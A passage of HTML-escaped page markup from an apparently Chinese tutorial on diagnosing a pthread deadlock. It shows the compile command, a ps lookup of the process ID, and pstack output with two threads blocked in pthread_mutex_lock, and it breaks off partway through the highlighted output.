&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 [dyu@xilinuxbldsrv purify]$ g++ -g lock.cpp -o lock -lpthread&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07783561306474-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07783561306474-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dyu&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;xilinuxbldsrv &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;purify&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cpp&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lpthread&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0007 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing3&quot;&gt;清单 3. 查找测试程序的进程号&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a0778a197066439&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 [dyu@xilinuxbldsrv purify]$ ps -ef|grep lock 
 dyu       6721  5751  0 15:21 pts/3    00:00:00 ./lock&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778a197066439-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778a197066439-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778a197066439-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dyu&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;xilinuxbldsrv &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;purify&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ps&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;grep &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;lock &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778a197066439-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;dyu&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5751&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lock&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0011 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing4&quot;&gt;清单 4. 对死锁进程第一次执行 pstack（pstack –进程号）的输出结果&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a0778e253008467&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 [dyu@xilinuxbldsrv purify]$ pstack 6721 
 Thread 5 (Thread 0x41e37940 (LWP 6722)): 
 #0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 
 #1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 
 #2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 
 #3  0x0000000000400a9b in func1() () 
 #4  0x0000000000400ad7 in thread1(void*) () 
 #5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 4 (Thread 0x42838940 (LWP 6723)): 
 #0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 
 #1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 
 #2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 
 #3  0x0000000000400a17 in func2() () 
 #4  0x0000000000400a53 in thread2(void*) () 
 #5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 3 (Thread 0x43239940 (LWP 6724)): 
 #0  0x0000003d19c9a541 in nanosleep () from /lib64/libc.so.6 
 #1  0x0000003d19c9a364 in sleep () from /lib64/libc.so.6 
 #2  0x00000000004009bc in thread3(void*) () 
 #3  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #4  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 2 (Thread 0x43c3a940 (LWP 6725)): 
 #0  0x0000003d19c9a541 in nanosleep () from /lib64/libc.so.6 
 #1  0x0000003d19c9a364 in sleep () from /lib64/libc.so.6 
 #2  0x0000000000400976 in thread4(void*) () 
 #3  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #4  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 1 (Thread 0x2b984ecabd90 (LWP 6721)): 
 #0  0x0000003d1a807b35 in pthread_join () from /lib64/libpthread.so.0 
 #1  0x0000000000400900 in main ()&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0778e253008467-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0778e253008467-32&quot;&gt;32&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dyu&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;xilinuxbldsrv &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;purify&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pstack&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x41e37940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6722&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a9b in func1() () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000000000400ad7 in thread1(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x42838940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6723&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a17 in func2() () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000000000400a53 in thread2(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-17&quot;&gt;
